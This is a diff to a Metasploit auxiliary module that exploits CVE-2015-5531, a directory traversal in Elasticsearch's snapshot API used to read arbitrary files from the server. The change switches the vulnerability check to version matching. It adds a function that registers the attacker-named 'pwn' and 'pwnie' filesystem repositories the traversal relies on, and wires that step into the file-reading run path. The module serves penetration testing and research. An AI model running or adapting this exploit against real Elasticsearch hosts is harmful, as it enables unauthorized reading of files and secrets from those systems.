@@ -47,28 +47,50 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def check_host(ip)
-    res1 = send_request_raw(
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, '_snapshot', 'pwn'),
-      'data' => '{"type":"fs","settings":{"location":"dsr"}}'
+  # CVE-2015-5531 affects Elasticsearch 1.0.0 through 1.6.0; 1.6.1 fixes it. Repository
+  # registration succeeds on patched nodes too, so classify by the reported version instead.
+  def check_host(_ip)
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path)
     )
 
-    return Exploit::CheckCode::Unknown('Failed to connect to the target.') unless res1
+    return Exploit::CheckCode::Unknown('Failed to connect to the target.') unless res
+    return Exploit::CheckCode::Unknown("Unexpected HTTP response code: #{res.code}") unless res.code == 200
 
-    res2 = send_request_raw(
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),
-      'data' => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}'
-    )
+    json = res.get_json_document
+    number = json.is_a?(Hash) && json['version'].is_a?(Hash) ? json['version']['number'] : nil
+    return Exploit::CheckCode::Safe('Target did not identify itself as Elasticsearch') unless number && json['tagline'].to_s.include?('You Know, for Search')
 
-    return Exploit::CheckCode::Unknown('Failed to connect to the target.') unless res2
-
-    if res1.body.include?('true') && res2.body.include?('true')
-      return Exploit::CheckCode::Appears('Successfully created snapshot repositories, suggesting the Snapshot API is vulnerable to CVE-2015-5531.')
+    begin
+      version = Rex::Version.new(number)
+    rescue ArgumentError
+      return Exploit::CheckCode::Unknown("Could not parse Elasticsearch version: #{number}")
     end
 
-    Exploit::CheckCode::Safe('Failed to create snapshot repositories.')
+    if version >= Rex::Version.new('1.0.0') && version <= Rex::Version.new('1.6.0')
+      return Exploit::CheckCode::Appears("Elasticsearch #{number} is affected by CVE-2015-5531 (1.0.0 - 1.6.0).")
+    end
+
+    Exploit::CheckCode::Safe("Elasticsearch #{number} is not affected by CVE-2015-5531 (1.0.0 - 1.6.0).")
+  end
+
+  # Registers the two filesystem repositories that the traversal request relies on.
+  #
+  # @return [Boolean] true if both repositories were acknowledged
+  def create_repositories
+    {
+      'pwn' => 'dsr',
+      'pwnie' => 'dsr/snapshot-ev1l'
+    }.all? do |name, location|
+      res = send_request_raw(
+        'method' => 'POST',
+        'uri' => normalize_uri(target_uri.path, '_snapshot', name),
+        'ctype' => 'application/json',
+        'data' => { type: 'fs', settings: { location: location } }.to_json
+      )
+      repository_acknowledged?(res)
+    end
   end
 
   def read_file(file)
@@ -109,6 +131,11 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
+    unless create_repositories
+      print_error('Failed to register the snapshot repositories required for the traversal')
+      return
+    end
+
     filename = datastore['FILEPATH']
     filename = filename[1, filename.length] if filename =~ %r{/^\//}
 
@@ -136,5 +163,16 @@ class MetasploitModule < Msf::Auxiliary
       fname
     )
     print_good("File saved in: #{path}")
+  end
+
+  private
+
+  def repository_acknowledged?(response)
+    return false unless response&.code == 200
+
+    json = response.get_json_document
+    json.is_a?(Hash) && json['acknowledged'] == true
+  rescue JSON::ParserError
+    false
   end
 end
